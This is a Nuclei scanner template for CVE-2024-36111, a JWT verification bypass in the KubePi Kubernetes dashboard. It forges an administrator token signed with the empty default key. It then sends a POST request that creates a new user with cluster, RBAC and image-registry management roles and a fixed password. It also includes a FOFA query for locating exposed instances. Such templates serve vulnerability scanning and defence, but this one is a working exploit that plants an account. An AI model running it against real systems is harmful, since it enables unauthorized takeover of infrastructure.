id: CVE-2024-36111

info:
  name: KubePi JWT - Verification Bypass
  author: Co5mos
  severity: critical
  description: |
    KubePi has a JWT authentication bypass vulnerability (CVE-2024-36111). Due to the JWT key being empty in the default configuration file, an attacker can generate a JWT token with the empty key to bypass authentication, thereby taking over the backend.
  metadata:
    verified: true
    fofa-query: "kubepi"
  tags: kubepi, bypass, cve, cve2024

variables:
  json: |
    {
      "name": "admin",
      "nickName": "Administrator",
      "email": "support@fit2cloud.com",
      "language": "zh-CN",
      "resourcePermissions": {},
      "isAdministrator": true,
      "mfa": {
        "enable": false,
        "secret": "",
        "approved": false
      }
    }
  token: '{{generate_jwt(json, "HS256", "", "{{to_unix_time("2032-12-30T16:30:10+00:00")}}")}}'
  name: "{{rand_base(8)}}"

http:
  - raw:
      - |
        POST /kubepi/api/v1/users HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{token}}

        {"apiVersion":"v1","kind":"User","name":"{{name}}","roles":["Common User","Manage Image Registries","Manage Clusters","Manage RBAC"],"nickName":"{{name}}","email":"{{randstr}}@{{name}}.com","authenticate":{"password":"12345678@{{name}}"},"mfa":{"enable":false,"secret":""}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, 'apiVersion\":\"v1\"')
          - contains(body, 'Manage Image Registries')
        condition: and
